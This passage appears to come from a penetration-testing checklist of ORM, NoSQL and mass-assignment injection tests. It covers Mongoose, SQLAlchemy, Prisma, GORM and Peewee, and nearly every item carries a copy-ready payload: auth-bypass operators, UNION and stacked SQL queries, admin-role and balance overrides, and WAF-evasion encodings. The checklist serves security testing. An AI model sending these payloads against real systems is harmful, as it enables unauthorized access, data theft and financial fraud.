**Payload Example:**

```
{"$where":"this.password.match(/^a.*/) ? true : false"}
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite, NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-077 — Mongoose - $exists Enumeration
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Inject $exists to check if fields exist in documents

**Expected Result:** Confirms existence of sensitive fields

**Payload Example:**

```
GET /users?secretToken[$exists]=true
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-078 — Mongoose - $or Injection for Auth Bypass
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Inject $or array to create always-true condition

**Expected Result:** Query is parameterized/ORM-safe; injection attempt fails and is rejected/logged

**Payload Example:**

```
{"$or":[{"username":"admin"},{"username":{"$ne":""}}]}
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite, NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-079 — Mongoose - Aggregation Pipeline Injection
**Test Category:** Mongoose/NoSQL ORM · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Mongoose/MongoDB aggregate

**Test Steps:** Inject stages into aggregation pipeline if built from user input

**Expected Result:** Unauthorized data extraction via $lookup/$unwind

**Payload Example:**

```
stage={"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"leaked"}}
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-080 — Mongoose - Prototype Pollution to Query Manipulation
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Send __proto__ / constructor.prototype keys to pollute query objects

**Expected Result:** Query conditions modified via prototype pollution

**Payload Example:**

```
{"__proto__":{"role":"admin"}}
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite, server-side-prototype-pollution scanner

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-081 — Mongoose - $set Operator in Update Injection
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Mongoose/MongoDB update

**Test Steps:** Inject $set into update operations to modify unintended fields

**Expected Result:** Arbitrary field updates (e.g. set role to admin)

**Payload Example:**

```
{"$set":{"role":"admin"}}
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-082 — Mongoose - $nin Operator Injection
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Inject $nin to exclude certain values from results

**Expected Result:** Query excludes specified values, changing results

**Payload Example:**

```
GET /users?role[$nin][0]=user
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-083 — SQLAlchemy - text() SQL Injection
**Test Category:** SQLAlchemy Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQLAlchemy search/filter

**Test Steps:** Inject SQL into text() function used in filter/where

**Expected Result:** Full SQL injection

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** SQLAlchemy injection: text()/filter injection exposing DB

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-084 — SQLAlchemy - filter() String Argument Injection
**Test Category:** SQLAlchemy Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SQLAlchemy filter

**Test Steps:** If filter() receives a string (legacy syntax) instead of expression, inject SQL

**Expected Result:** SQL injection via filter string

**Payload Example:**

```
q=1 OR 1=1
```

**Impact:** SQLAlchemy injection: text()/filter injection exposing DB

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-085 — SQLAlchemy - engine.execute() / session.execute() Injection
**Test Category:** SQLAlchemy Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQLAlchemy execute

**Test Steps:** Inject SQL into execute() with string concatenation

**Expected Result:** Full SQL injection

**Payload Example:**

```
q='; SELECT * FROM users--
```

**Impact:** SQLAlchemy injection: text()/filter injection exposing DB

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-086 — SQLAlchemy - order_by() Injection
**Test Category:** SQLAlchemy Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** SQLAlchemy order

**Test Steps:** Inject into order_by() using literal_column() or text() with user input

**Expected Result:** SQL injection via ORDER BY

**Payload Example:**

```
sort=name; (SELECT pg_sleep(5))
```

**Impact:** SQLAlchemy injection: text()/filter injection exposing DB

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-087 — SQLAlchemy - literal_column() Injection
**Test Category:** SQLAlchemy Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SQLAlchemy select

**Test Steps:** Inject SQL via literal_column() function with user input

**Expected Result:** Arbitrary SQL expressions in SELECT

**Payload Example:**

```
col=(SELECT password FROM users LIMIT 1)
```

**Impact:** SQLAlchemy injection: text()/filter injection exposing DB

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-088 — SQLAlchemy - column().op() Injection
**Test Category:** SQLAlchemy Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** SQLAlchemy filter

**Test Steps:** Inject custom operators via .op() with user input

**Expected Result:** Arbitrary SQL operator injection

**Payload Example:**

```
op=) OR (1=1
```

**Impact:** SQLAlchemy injection: text()/filter injection exposing DB

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-089 — Prisma - Filter Object Injection
**Test Category:** Prisma Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Prisma filter params

**Test Steps:** Inject Prisma filter operators (equals/not/contains/startsWith/gt/lt) via JSON

**Expected Result:** Unauthorized data access through manipulated filters

**Payload Example:**

```
GET /users?where[role][equals]=admin
```

**Impact:** Prisma injection: raw-query/filter abuse leaking or altering data

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-090 — Prisma - $queryRaw Injection
**Test Category:** Prisma Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Prisma raw queries

**Test Steps:** Inject SQL into $queryRaw / $queryRawUnsafe with string concatenation

**Expected Result:** Full SQL injection

**Payload Example:**

```
q=' UNION SELECT * FROM User--
```

**Impact:** Prisma injection: raw-query/filter abuse leaking or altering data

**Tools:** sqlmap, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-091 — Prisma - $executeRaw Injection
**Test Category:** Prisma Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Prisma raw queries

**Test Steps:** Inject SQL into $executeRaw / $executeRawUnsafe with string concat

**Expected Result:** Full SQL injection (write operations)

**Payload Example:**

```
q='; UPDATE User SET role='admin' WHERE id=1;--
```

**Impact:** Prisma injection: raw-query/filter abuse leaking or altering data

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-092 — Prisma - Nested Relation Filter Injection
**Test Category:** Prisma Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Prisma nested queries

**Test Steps:** Inject filters on related models through nested query objects

**Expected Result:** Access data through relationships

**Payload Example:**

```
GET /posts?where[author][role][equals]=admin
```

**Impact:** Prisma injection: raw-query/filter abuse leaking or altering data

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-093 — Prisma - Select/Include Object Injection
**Test Category:** Prisma Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Prisma select/include

**Test Steps:** Inject into select/include objects to return sensitive relations or fields

**Expected Result:** Sensitive data included in response

**Payload Example:**

```
GET /users?include[secrets]=true
```

**Impact:** Prisma injection: raw-query/filter abuse leaking or altering data

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-094 — GORM - Where() String Injection
**Test Category:** GORM (Go) Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GORM search/filter

**Test Steps:** Inject SQL into Where() string parameter (not struct/map syntax)

**Expected Result:** SQL injection via WHERE clause

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** GORM injection: condition/raw injection, DB read &amp; authN bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-095 — GORM - Raw() SQL Injection
**Test Category:** GORM (Go) Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GORM raw query

**Test Steps:** Inject SQL into Raw() function with string concatenation

**Expected Result:** Full SQL injection

**Payload Example:**

```
q='; SELECT * FROM users--
```

**Impact:** GORM injection: condition/raw injection, DB read &amp; authN bypass

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-096 — GORM - Order() Injection
**Test Category:** GORM (Go) Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GORM order

**Test Steps:** Inject SQL into Order() with user-controlled sort parameter

**Expected Result:** SQL injection via ORDER BY

**Payload Example:**

```
sort=id;SELECT pg_sleep(5)--
```

**Impact:** GORM injection: condition/raw injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-097 — GORM - Group() Injection
**Test Category:** GORM (Go) Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GORM group

**Test Steps:** Inject SQL into Group() with user-controlled parameter

**Expected Result:** SQL injection via GROUP BY

**Payload Example:**

```
group=id;SELECT 1--
```

**Impact:** GORM injection: condition/raw injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-098 — GORM - Having() Injection
**Test Category:** GORM (Go) Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GORM having

**Test Steps:** Inject SQL into Having() string parameter

**Expected Result:** SQL injection via HAVING

**Payload Example:**

```
having=1=1) UNION SELECT password FROM users--
```

**Impact:** GORM injection: condition/raw injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-099 — GORM - Select() Injection
**Test Category:** GORM (Go) Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GORM select

**Test Steps:** Inject SQL into Select() with user-controlled field names

**Expected Result:** Arbitrary column extraction

**Payload Example:**

```
fields=*,(SELECT password FROM users LIMIT 1)
```

**Impact:** GORM injection: condition/raw injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-100 — Peewee - SQL() Injection
**Test Category:** Peewee (Python) Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Peewee search/filter

**Test Steps:** Inject SQL into peewee.SQL() or .where(SQL()) with user input

**Expected Result:** SQL injection

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** Peewee ORM injection: raw/expression injection exposing DB

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-101 — Peewee - RawQuery() Injection
**Test Category:** Peewee (Python) Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Peewee raw

**Test Steps:** Inject SQL into RawQuery() with string concatenation

**Expected Result:** Full SQL injection

**Payload Example:**

```
q='; SELECT * FROM users--
```

**Impact:** Peewee ORM injection: raw/expression injection exposing DB

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-102 — Mass Assignment - Role Escalation
**Test Category:** Mass Assignment · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any REST API endpoint

**Test Steps:** Add role/is_admin/isAdmin/is_superuser field to POST/PUT request body

**Expected Result:** User role is escalated to admin

**Payload Example:**

```
{"username":"test","email":"t@t.com","role":"admin"}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite, Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-103 — Mass Assignment - Admin Flag Override
**Test Category:** Mass Assignment · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User registration endpoint

**Test Steps:** Add admin boolean field during user registration

**Expected Result:** User created with admin privileges

**Payload Example:**

```
{"name":"test","is_admin":true},{"name":"test","is_admin":true,"isAdmin":true,"admin":true,"is_superuser":true}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite, Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-104 — Mass Assignment - Password Override
**Test Category:** Mass Assignment · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile update endpoint

**Test Steps:** Add password/password_hash field to profile update request

**Expected Result:** Password changed without current password verification

**Payload Example:**

```
{"name":"test","password":"newpass123"}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-105 — Mass Assignment - ID/Foreign Key Manipulation
**Test Category:** Mass Assignment · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any CRUD endpoint

**Test Steps:** Modify id/user_id/org_id fields in request body

**Expected Result:** Record associated with different user/org

**Payload Example:**

```
{"name":"test","user_id":1,"org_id":1}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-106 — Mass Assignment - Hidden Field Discovery
**Test Category:** Mass Assignment · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any CRUD endpoint

**Test Steps:** Use Arjun/param-miner to discover hidden parameters that map to model fields

**Expected Result:** Discover writable hidden parameters

**Payload Example:**

```
Iterate: verified, confirmed, approved, balance, credits, plan
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Arjun, Param Miner, Burp Intruder

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-107 — Mass Assignment - Email Verified Flag
**Test Category:** Mass Assignment · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User update endpoint

**Test Steps:** Add email_verified/verified/confirmed field to bypass email verification

**Expected Result:** Email verification bypassed

**Payload Example:**

```
{"email":"attacker@evil.com","email_verified":true},{"email_verified":true,"verified":true,"confirmed":true}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-108 — Mass Assignment - Balance/Credits Manipulation
**Test Category:** Mass Assignment · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/billing endpoints

**Test Steps:** Add balance/credits/amount fields to manipulate financial data

**Expected Result:** Financial values modified

**Payload Example:**

```
{"plan":"free","balance":999999},{"balance":999999,"credits":999999,"amount":0}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-109 — Mass Assignment - Plan/Tier Override
**Test Category:** Mass Assignment · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Subscription/plan endpoints

**Test Steps:** Add plan/tier/subscription_type field to upgrade plan for free

**Expected Result:** Plan upgraded without payment

**Payload Example:**

```
{"plan":"enterprise","tier":"premium"}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-110 — Mass Assignment - Timestamp Manipulation
**Test Category:** Mass Assignment · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any API endpoint

**Test Steps:** Add created_at/updated_at/expires_at fields to manipulate timestamps

**Expected Result:** Timestamps modified (e.g. extend trial)

**Payload Example:**

```
{"trial_expires_at":"2099-12-31"}
```

**Impact:** Mass assignment: set privileged/hidden fields (role/isAdmin/price) via ORM bind

**Tools:** Burp Suite

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-111 — ORM Injection - SQL Comment Injection
**Test Category:** ORM Bypass Techniques · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ORM filter inputs

**Test Steps:** Inject various comment styles to truncate ORM-generated query

**Expected Result:** Query truncated after comment

**Payload Example:**

```
-- / # / /* */ / ;%00
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-112 — ORM Injection - Unicode/Encoding Bypass
**Test Category:** ORM Bypass Techniques · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ORM filter inputs

**Test Steps:** Use URL encoding, double encoding, Unicode to bypass input filters

**Expected Result:** WAF/filter bypassed, ORM query modified

**Payload Example:**

```
%27%20OR%201%3D1-- / %25%32%37 (double encode)
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-113 — ORM Injection - Case Manipulation Bypass
**Test Category:** ORM Bypass Techniques · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ORM filter inputs

**Test Steps:** Use mixed case to bypass keyword filters

**Expected Result:** Filter bypassed

**Payload Example:**

```
' oR 1=1-- / ' Or '1'='1
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-114 — ORM Injection - Whitespace Alternative Bypass
**Test Category:** ORM Bypass Techniques · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ORM filter inputs

**Test Steps:** Replace spaces with tabs, newlines, or /**/ comments

**Expected Result:** Space-based filters bypassed

**Payload Example:**

```
'/**/OR/**/1=1--  /  '\tOR\t1=1--
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

